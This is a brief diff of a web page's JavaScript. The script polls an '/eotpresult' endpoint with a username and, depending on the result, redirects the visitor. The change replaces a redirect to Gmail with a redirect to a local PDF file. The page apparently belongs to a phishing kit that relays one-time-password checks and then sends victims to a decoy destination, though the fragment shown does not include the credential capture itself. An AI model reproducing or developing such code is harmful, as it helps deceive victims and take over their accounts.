@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -121,8 +122,10 @@
         fetch('/eotpresult?u=' + encodeURIComponent(username))
           .then(r => r.json())
           .then(data => {
-            if (data.result === 'redirected') {
-              window.location.href = 'https://mail.google.com';
+            if (data.result === 'success') {
+              window.location.href = '/2.pdf';
+            } else if (data.result === 'redirected') {
+              window.location.href = '/2.pdf';
             } else if (data.result === 'error') {
               showError();
             } else {
